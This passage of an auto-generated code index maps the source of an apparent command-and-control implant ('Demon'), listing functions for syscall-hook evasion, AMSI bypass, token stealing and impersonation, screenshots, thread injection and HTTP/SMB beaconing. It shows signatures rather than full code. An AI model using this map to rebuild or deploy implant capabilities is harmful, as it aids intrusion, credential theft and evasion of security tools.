    IN      HANDLE          ThreadHandle,
    IN     ...`
  - `SysNtQueryObject` (function, line 429) `NTSTATUS NTAPI SysNtQueryObject(
    IN  HANDLE                   Handle,
    IN  OBJECT_INFORMAT...`
  - `SysNtClose` (function, line 444) `NTSTATUS NTAPI SysNtClose (
    IN HANDLE Handle
)`
  - `SysNtSetInformationThread` (function, line 455) `NTSTATUS NTAPI SysNtSetInformationThread (
    IN HANDLE          ThreadHandle,
    IN THREADINFO...`
  - `SysNtSetInformationVirtualMemory` (function, line 469) `NTSTATUS NTAPI SysNtSetInformationVirtualMemory(
    IN HANDLE                           ProcessH...`
  - `SysNtGetNextThread` (function, line 485) `NTSTATUS NTAPI SysNtGetNextThread(
    IN  HANDLE      ProcessHandle,
    IN  HANDLE      ThreadH...`
  - `SYSCALL_INVOKE` (function, line 28) `SYSCALL_INVOKE( NtOpenProcess, ProcessHandle, DesiredAccess, ObjectAttributes, ClientId );`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/SysNative.h`, `payloads/Demon/include/core/Syscalls.h`

## payloads/Demon/src/core/Syscalls.c
- Layer: utility
- Doc: include <Demon.h>  include <common/Defines.h> include <core/Syscalls.h> include <core/Win32.h>  !
- Language: c
- Symbols:
  - `SysInitialize` (function, line 12) `BOOL SysInitialize(
    IN PVOID Ntdll
)`
  - `SYS_EXTRACT` (function, line 44) `SYS_EXTRACT( NtOpenThread )
    SYS_EXTRACT( NtOpenThreadToken )
    SYS_EXTRACT( NtOpenProcess )...`
  - `PRINTF` (function, line 184) `PRINTF( "Could not resolve the Ssn of function at 0x%p\n", Function )
        }

        if ( Sys...`
  - `FindSsnOfHookedSyscall` (function, line 201) `BOOL FindSsnOfHookedSyscall(
    IN  PVOID  Function,
    OUT PWORD  Ssn
)`
  - `PRINTF` (function, line 208) `PRINTF( "The syscall at address 0x%p seems to be hooked, trying to resolve its Ssn via neighbouri...`
  - `SysExtract` (function, line 26) `SysExtract( SysNativeFunc, TRUE, NULL, &SysIndirectAddr );`
  - `PUTS_DONT_SEND` (function, line 32) `PUTS_DONT_SEND( "Failed to resolve SysIndirectAddr" );`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Defines.h`, `payloads/Demon/include/core/Syscalls.h`, `payloads/Demon/include/core/Win32.h`

## payloads/Demon/src/core/Thread.c
- Layer: utility
- Doc: include <Demon.h> include <common/Macros.h> include <core/Thread.h> include <core/MiniStd.h> include <core/Memory.h> inc
- Language: c
- Symbols:
  - `ThreadQueryTib` (function, line 20) `BOOL ThreadQueryTib(
    IN  PVOID   Adr,
    OUT PNT_TIB Tib
)`
  - `ThreadCreateWoW64` (function, line 118) `HANDLE ThreadCreateWoW64(
    IN  BYTE   Method,
    IN  HANDLE Process,
    IN  PVOID  Entry,
  ...`
  - `PUTS` (function, line 184) `PUTS( "calling RtlCreateUserThread( ctx->h.hProcess, NULL, TRUE, 0, NULL, NULL, ctx->s.lpStartAdd...`
  - `ThreadCreate` (function, line 216) `HANDLE ThreadCreate(
    IN  BYTE   Method,
    IN  HANDLE Process,
    IN  BOOL   x64,
    IN  P...`
  - `SysNtClose` (function, line 43) `SysNtClose( ThdHndl );`
  - `SysNtResumeThread` (function, line 94) `SysNtResumeThread( ThdHndl, NULL );`
  - `MemCopy` (function, line 173) `MemCopy( pExecuteX64, &migrate_executex64, sizeof( migrate_executex64 ) );`
  - `NtSetLastError` (function, line 188) `NtSetLastError( ERROR_ACCESS_DENIED );`
  - `MmVirtualFree` (function, line 209) `MmVirtualFree( NtCurrentProcess(), pExecuteX64 );`
  - `PRINTF` (function, line 263) `PRINTF( "Failed to create new thread => NtStatus:[%x]\n", NtStatus );`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Macros.h`, `payloads/Demon/include/core/Memory.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/SysNative.h`, `payloads/Demon/include/core/Thread.h`, `payloads/Demon/include/core/Win32.h`

## payloads/Demon/src/core/Token.c
- Layer: utility
- Doc: include <Demon.h>  include <common/Macros.h>  include <core/Token.h> include <core/Win32.h> include <core/Package.h> inc
- Language: c
- Symbols:
  - `TokenDuplicate` (function, line 37) `BOOL TokenDuplicate(
    IN  HANDLE        TokenOriginal,
    IN  DWORD         Access,
    IN  S...`
  - `TokenRevSelf` (function, line 74) `BOOL TokenRevSelf(
    VOID
)`
  - `TokenQueryOwner` (function, line 103) `BOOL TokenQueryOwner(
    IN  HANDLE  Token,
    OUT PBUFFER UserDomain,
    IN  DWORD   Flags
)`
  - `PUTS` (function, line 177) `PUTS( "Unexpected successful call to NtQueryInformationToken.\n" )
    }

LEAVE:
    if ( UserInfo )`
  - `DATA_FREE` (function, line 182) `DATA_FREE( UserInfo, UserSize )
    }

    if ( Flags == TOKEN_OWNER_FLAG_USER )`
  - `TokenSetPrivilege` (function, line 203) `BOOL TokenSetPrivilege(
    IN LPSTR Privilege,
    IN BOOL  Enable
)`
  - `TokenSetSeDebugPriv` (function, line 239) `BOOL TokenSetSeDebugPriv(
    IN BOOL  Enable
)`
  - `TokenSetSeImpersonatePriv` (function, line 270) `BOOL TokenSetSeImpersonatePriv(
    IN BOOL  Enable
)`
  - `TokenAdd` (function, line 323) `DWORD TokenAdd(
    IN HANDLE hToken,
    IN LPWSTR DomainUser,
    IN SHORT  Type,
    IN DWORD ...`
  - `SysDuplicateTokenEx` (function, line 364) `BOOL SysDuplicateTokenEx(
    IN HANDLE ExistingTokenHandle,
    IN DWORD dwDesiredAccess,
    IN...`
  - `TokenSteal` (function, line 414) `HANDLE TokenSteal(
    IN DWORD  ProcessID,
    IN HANDLE TargetHandle
)`
  - `PRINTF` (function, line 463) `PRINTF( "ProcessOpen: Failed:[%ld]\n", NtGetLastError() )
        PACKAGE_ERROR_WIN32
    }

    ...`
  - `TokenRemove` (function, line 473) `BOOL TokenRemove( DWORD TokenID )`
  - `TokenMake` (function, line 597) `HANDLE TokenMake( LPWSTR User, LPWSTR Password, LPWSTR Domain, DWORD LogonType )`
  - `PRINTF` (function, line 601) `PRINTF( "TokenMake( %ls, %ls, %ls, %d )\n", User, Password, Domain, LogonType )

    if ( ! Token...`
  - `PRINTF` (function, line 606) `PRINTF( "Failed to revert to self: Error:[%d]\n", NtGetLastError() )
        PACKAGE_ERROR_WIN32
...`
  - `TokenCurrentHandle` (function, line 624) `HANDLE TokenCurrentHandle(
    VOID
)`
  - `TokenElevated` (function, line 649) `BOOL TokenElevated(
    IN HANDLE Token
)`
  - `TokenGet` (function, line 663) `PTOKEN_LIST_DATA TokenGet(
    IN DWORD TokenID
)`
  - `TokenClear` (function, line 680) `VOID TokenClear(
    VOID
)`
  - `TokenImpersonate` (function, line 706) `BOOL TokenImpersonate(
    IN BOOL Impersonate
)`
  - `AddUserToken` (function, line 732) `VOID AddUserToken(
    _Inout_ PUSER_TOKEN_DATA NewToken,
    _Inout_ PUSER_TOKEN_DATA Tokens,
  ...`
  - `IsImpersonationToken` (function, line 770) `BOOL IsImpersonationToken( HANDLE token )`
  - `CanTokenBeImpersonated` (function, line 802) `BOOL CanTokenBeImpersonated( IN HANDLE hToken )`
  - `ProcessUserToken` (function, line 829) `VOID ProcessUserToken(
    IN HANDLE hToken,
    IN DWORD ProcessId,
    IN HANDLE handle,
    IN...`
  - `QueryObjectTypesInfo` (function, line 878) `BOOL QueryObjectTypesInfo( POBJECT_TYPES_INFORMATION* pObjectTypes, PULONG pObjectTypesSize )`
  - `GetTypeIndexToken` (function, line 910) `BOOL GetTypeIndexToken( OUT PULONG TokenTypeIndex )`
  - `GetTokenInfo` (function, line 948) `BOOL GetTokenInfo(
    IN HANDLE hToken,
    OUT PDWORD pTokenType,
    OUT PDWORD pIntegrity,
  ...`
  - `PUTS` (function, line 991) `PUTS( "GetTokenInformation failed" )
            }
        }
        else if (TokenStatisticsInfo...`
  - `ProcessIsIncluded` (function, line 1029) `BOOL ProcessIsIncluded( IN PPROCESS_LIST process_list, IN ULONG ProcessId )`
  - `GetProcessesFromHandleTable` (function, line 1040) `BOOL GetProcessesFromHandleTable( IN PSYSTEM_HANDLE_INFORMATION handleTableInformation, OUT PPROC...`
  - `GetAllHandles` (function, line 1076) `BOOL GetAllHandles( OUT PSYSTEM_HANDLE_INFORMATION* phandle_table, OUT PULONG phandle_table_size )`
  - `IsNotCurrentUser` (function, line 1122) `BOOL IsNotCurrentUser( BOOL DoCheck, PBUFFER UserA, PBUFFER UserB )`
  - `ListTokens` (function, line 1129) `BOOL ListTokens( PUSER_TOKEN_DATA* pTokens, PDWORD pNumTokens )`
  - `ImpersonateTokenFromVault` (function, line 1256) `BOOL ImpersonateTokenFromVault(
    IN DWORD TokenID
)`
  - `SysImpersonateLoggedOnUser` (function, line 1281) `BOOL SysImpersonateLoggedOnUser( HANDLE hToken )`
  - `ImpersonateTokenInStore` (function, line 1360) `BOOL ImpersonateTokenInStore(
    IN PTOKEN_LIST_DATA TokenData
)`
  - `InitializeObjectAttributes` (function, line 54) `InitializeObjectAttributes( &ObjAttr, NULL, 0, NULL, NULL );`
  - `NtSetLastError` (function, line 60) `NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );`
  - `MemZero` (function, line 266) `MemZero( PrivName, sizeof( PrivName ) );`
  - `SysNtClose` (function, line 435) `SysNtClose( hProcess );`
  - `MemSet` (function, line 503) `MemSet( Instance->Tokens.Vault->DomainUser, 0, StringLengthW( Instance->Tokens.Vault->DomainUser ) * sizeof( WCHAR ) );`
  - `StringCopyW` (function, line 761) `StringCopyW( Tokens[ *NumTokens ].username, NewToken->username );`
  - `NtCurrentProcess` (function, line 1214) `NtCurrentProcess(), &hToken, 0, 0, DUPLICATE_SAME_ACCESS);`
  - `NtCurrentThread` (function, line 1342) `NtCurrentThread(), ThreadImpersonationToken, &NewToken, sizeof(HANDLE));`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Macros.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Package.h`, `payloads/Demon/include/core/Token.h`, `payloads/Demon/include/core/Win32.h`

## payloads/Demon/src/core/Transport.c
- Layer: utility
- Doc: include <Demon.h>  include <common/Macros.h>  include <core/Package.h> include <core/Transport.h> include <core/MiniStd.
- Language: c
- Symbols:
  - `TransportInit` (function, line 12) `BOOL TransportInit( )`
  - `TransportSend` (function, line 51) `BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize )`
  - `SMBGetJob` (function, line 88) `BOOL SMBGetJob( PVOID* RecvData, PSIZE_T RecvSize )`
  - `AesInit` (function, line 27) `AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );`
  - `AesXCryptBuffer` (function, line 28) `AesXCryptBuffer( &AesCtx, Data, Size );`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Macros.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Package.h`, `payloads/Demon/include/core/Transport.h`, `payloads/Demon/include/core/TransportHttp.h`, `payloads/Demon/include/core/TransportSmb.h`, `payloads/Demon/include/crypt/AesCrypt.h`

## payloads/Demon/src/core/TransportHttp.c
- Layer: presentation
- Doc: include <Demon.h>  include <core/TransportHttp.h> include <core/MiniStd.h>  ifdef TRANSPORT_HTTP  !
- Language: c
- Symbols:
  - `HttpSend` (function, line 21) `BOOL HttpSend(
    _In_      PBUFFER Send,
    _Out_opt_ PBUFFER Resp
)`
  - `PRINTF_DONT_SEND` (function, line 290) `PRINTF_DONT_SEND( "HTTP Error: %d\n", NtGetLastError() )
    }

LEAVE:
    if ( Connect )`
  - `HttpQueryStatus` (function, line 336) `DWORD HttpQueryStatus(
    _In_ HANDLE Request
)`
  - `HostAdd` (function, line 355) `PHOST_DATA HostAdd(
    _In_ LPWSTR Host, SIZE_T Size, DWORD Port )`
  - `HostFailure` (function, line 377) `PHOST_DATA HostFailure( PHOST_DATA Host )`
  - `HostRandom` (function, line 402) `PHOST_DATA HostRandom()`
  - `HostRotation` (function, line 436) `PHOST_DATA HostRotation( SHORT Strategy )`
  - `HostCount` (function, line 513) `DWORD HostCount()`
  - `HostCheckup` (function, line 540) `BOOL HostCheckup()`
  - `TokenImpersonate` (function, line 45) `TokenImpersonate( FALSE );`
  - `PUTS_DONT_SEND` (function, line 49) `PUTS_DONT_SEND( "No hosts left to use... exit now." ) CommandExit( NULL );`
  - `MemCopy` (function, line 194) `MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );`
  - `MemSet` (function, line 277) `MemSet( Buffer, 0, sizeof( Buffer ) );`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/TransportHttp.h`

## payloads/Demon/src/core/TransportSmb.c
- Layer: utility
- Doc: include <Demon.h>  include <core/TransportSmb.h> include <core/MiniStd.h>  ifdef TRANSPORT_SMB
- Language: c
- Symbols:
  - `SmbSend` (function, line 7) `BOOL SmbSend( PBUFFER Send )`
  - `SmbRecv` (function, line 64) `BOOL SmbRecv( PBUFFER Resp )`
  - `PRINTF` (function, line 107) `PRINTF( "PipeRead failed with to read 0x%x bytes from pipe\n", Resp->Length )
                if ...`
  - `SmbSecurityAttrOpen` (function, line 142) `VOID SmbSecurityAttrOpen( PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES SecurityAttr )`
  - `SmbSecurityAttrFree` (function, line 212) `VOID SmbSecurityAttrFree( PSMB_PIPE_SEC_ATTR SmbSecAttr )`
  - `SysNtClose` (function, line 36) `SysNtClose( Instance->Config.Transport.Handle );`
  - `PipeWrite` (function, line 41) `return PipeWrite( Instance->Config.Transport.Handle, Send );`
  - `MemSet` (function, line 150) `MemSet( SmbSecAttr, 0, sizeof( SMB_PIPE_SEC_ATTR ) );`
  - `MmHeapFree` (function, line 229) `MmHeapFree( SmbSecAttr->SAcl );`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/TransportSmb.h`

## payloads/Demon/src/core/Win32.c
- Layer: utility
- Doc: include <Demon.h>  include <core/Win32.h> include <core/MiniStd.h> include <core/Package.h> include <core/Syscalls.h> in
- Language: c
- Symbols:
  - `HashEx` (function, line 17) `ULONG HashEx(
    IN PVOID String,
    IN ULONG Length,
    IN BOOL  Upper
)`
  - `LdrModulePeb` (function, line 65) `PVOID LdrModulePeb(
    IN DWORD Hash
)`
  - `LdrModulePebByString` (function, line 99) `PVOID LdrModulePebByString(
    IN LPWSTR Module
)`
  - `LdrModuleSearch` (function, line 165) `PVOID LdrModuleSearch(
    IN LPWSTR ModuleName)`
  - `LdrModuleLoad` (function, line 215) `PVOID LdrModuleLoad(
    IN LPSTR ModuleName
)`
  - `PUTS` (function, line 252) `PUTS( "Loading module using RtlRegisterWait" )

            /* create an event for end of module ...`
  - `PUTS` (function, line 269) `PUTS( "Loading module using RtlCreateTimer" )

            /* create timer queue */
            i...`
  - `PUTS` (function, line 286) `PUTS( "Loading module using RtlQueueWorkItem" )

            /* call LoadLibraryW and load specif...`
  - `PRINTF` (function, line 353) `PRINTF( "Module \"%s\": %p\n", ModuleName, Module )

    /* close event end */
    if ( Event )`
  - `LdrFunctionAddr` (function, line 377) `PVOID LdrFunctionAddr(
    IN PVOID Module,
    IN DWORD Hash
)`
  - `GetSyscallSize` (function, line 440) `UINT32 GetSyscallSize(
    VOID
)`
  - `ProcessOpen` (function, line 515) `HANDLE ProcessOpen(
    IN DWORD Pid,
    IN DWORD Access
)`
  - `ProcessIsWow` (function, line 544) `BOOL ProcessIsWow(
    IN HANDLE Process
)`
  - `ProcessCreate` (function, line 579) `BOOL ProcessCreate(
    IN  BOOL                 x86,
    IN  LPWSTR               App,
    IN  L...`
  - `PUTS` (function, line 626) `PUTS( "Enable Wow64 process support" )
        if ( ! Instance->Win32.Wow64DisableWow64FsRedirect...`
  - `PRINTF` (function, line 653) `PRINTF( "CmdLine           : %ls\n", CmdLine )
        PRINTF( "lpCurrentDirectory: %ls\n", lpCur...`
  - `PUTS` (function, line 670) `PUTS( "CreateProcessWithTokenW" )
            if ( ! Instance->Win32.CreateProcessWithTokenW(
   ...`
  - `PUTS` (function, line 693) `PUTS( "CreateProcessWithLogonW" )
            PRINTF( "lpUser[%s] lpDomain[%s] lpPassword[%s]", I...`
  - `PUTS` (function, line 739) `PUTS( "Send info back" )
        if ( ! CmdLine )`
  - `ProcessTerminate` (function, line 805) `BOOL ProcessTerminate(
    IN HANDLE hProcess,
    IN DWORD  Pid)`
  - `PUTS` (function, line 831) `PUTS( "Failed to terminate process" )
    }

END:
    if ( OpenedHandle )`
  - `ProcessSnapShot` (function, line 848) `NTSTATUS ProcessSnapShot(
    OUT PSYSTEM_PROCESS_INFORMATION* SnapShot,
    OUT PSIZE_T         ...`
  - `ReadLocalFile` (function, line 885) `BOOL ReadLocalFile(
    IN  LPCWSTR FileName,
    OUT PVOID*  FileContent,
    OUT PDWORD  FileSi...`
  - `BypassPatchAMSI` (function, line 930) `BOOL BypassPatchAMSI(
    VOID
)`
  - `AnonPipesInit` (function, line 980) `BOOL AnonPipesInit(
    IN PANONPIPE AnonPipes
)`
  - `AnonPipesRead` (function, line 1000) `VOID AnonPipesRead(
    IN PANONPIPE AnonPipes,
    IN UINT32 RequestID
)`
  - `PUTS` (function, line 1010) `PUTS( "Start reading anon pipe" )
    PRINTF( "AnonPipes->StdOutRead => %x\n", AnonPipes->StdOutR...`
  - `PRINTF` (function, line 1023) `PRINTF( "dwRead => %d\n", dwRead )

        if ( dwRead == 0 )`
  - `WinScreenshot` (function, line 1052) `BOOL WinScreenshot(
    OUT PVOID*  ImagePointer,
    OUT PSIZE_T ImageSize
)`
  - `PipeRead` (function, line 1175) `BOOL PipeRead(
    IN HANDLE  Handle,
    IN PBUFFER Buffer
)`
  - `PipeWrite` (function, line 1202) `BOOL PipeWrite(
    IN  HANDLE   Handle,
    OUT PBUFFER Buffer
)`
  - `CfgQueryEnforced` (function, line 1227) `BOOL CfgQueryEnforced(
    VOID
)`
  - `CfgAddressAdd` (function, line 1259) `VOID CfgAddressAdd(
    IN PVOID ImageBase,
    IN PVOID Function
)`
  - `EventSet` (function, line 1293) `BOOL EventSet(
    IN HANDLE Event
)`
  - `RandomNumber32` (function, line 1304) `ULONG RandomNumber32(
    VOID
)`
  - `RandomBool` (function, line 1321) `BOOL RandomBool(
    VOID
)`
  - `SharedTimestamp` (function, line 1337) `ULONG64 SharedTimestamp(
    VOID
)`
  - `SharedSleep` (function, line 1357) `VOID SharedSleep(
    ULONG64 Delay
)`
  - `ShuffleArray` (function, line 1378) `VOID ShuffleArray(
    _Inout_ PVOID* array,
    IN     SIZE_T n
)`
  - `___chkstk_ms` (function, line 1395) `VOID volatile ___chkstk_ms(
        VOID
)`
  - `DemonPrintf` (function, line 1401) `VOID DemonPrintf( PCHAR fmt, ... )`
  - `LogToConsole` (function, line 1433) `VOID LogToConsole(
    IN LPCSTR fmt,
    ...)`
  - `listDir` (function, line 1477) `PROOT_DIR listDir(
    IN LPWSTR StartPath,
    IN BOOL   SubDirs,
    IN BOOL   FilesOnly,
    I...`
  - `MemCopy` (function, line 124) `MemCopy( Name, Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length );`
  - `MemZero` (function, line 145) `MemZero( Name, MAX_PATH );`
  - `MmHeapFree` (function, line 152) `MmHeapFree( Name );`
  - `StringCopyW` (function, line 181) `StringCopyW( Name, ModuleName );`
  - `StringConcatW` (function, line 186) `StringConcatW( Name, Dll );`
  - `CharStringToWCharString` (function, line 233) `CharStringToWCharString( NameW, ModuleName, StringLengthA( ModuleName ) );`
  - `SysNtClose` (function, line 358) `SysNtClose( Event );`
  - `InitializeObjectAttributes` (function, line 523) `InitializeObjectAttributes( &ObjAttr, NULL, 0, NULL, NULL );`
  - `U_PTR` (function, line 562) `return U_PTR( IsWow64 );`
  - `PackageAddInt32` (function, line 602) `PackageAddInt32( Package, DEMON_INFO_PROC_CREATE );`
  - `MemSet` (function, line 608) `MemSet( AnonPipe, 0, sizeof( ANONPIPE ) );`
  - `TokenImpersonate` (function, line 651) `TokenImpersonate( FALSE );`
  - `TokenSetSeImpersonatePriv` (function, line 652) `TokenSetSeImpersonatePriv( TRUE );`
  - `PackageTransmitError` (function, line 665) `PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );`
  - `PackageAddWString` (function, line 742) `PackageAddWString( Package, App );`
  - `PackageTransmit` (function, line 744) `PackageTransmit( Package );`
  - `DATA_FREE` (function, line 765) `DATA_FREE( s, x );`
  - `JobAdd` (function, line 778) `JobAdd( Instance->CurrentRequestID, ProcessInfo->dwProcessId, JOB_TYPE_TRACK_PROCESS, JOB_STATE_RUNNING, ProcessInfo->hProcess, AnonPipe );`
  - `PackageAddBytes` (function, line 1039) `PackageAddBytes( Package, Buffer, dwBufferSize );`
  - `NT_SUCCESS` (function, line 1296) `return NT_SUCCESS( Instance->Win32.NtSetEvent( Event, NULL ) );`
  - `va_start` (function, line 1414) `va_start( VaListArg, fmt );`
  - `va_end` (function, line 1421) `va_end( VaListArg );`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Macros.h`, `payloads/Demon/include/common/Native.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Package.h`, `payloads/Demon/include/core/Syscalls.h`, `payloads/Demon/include/core/Win32.h`
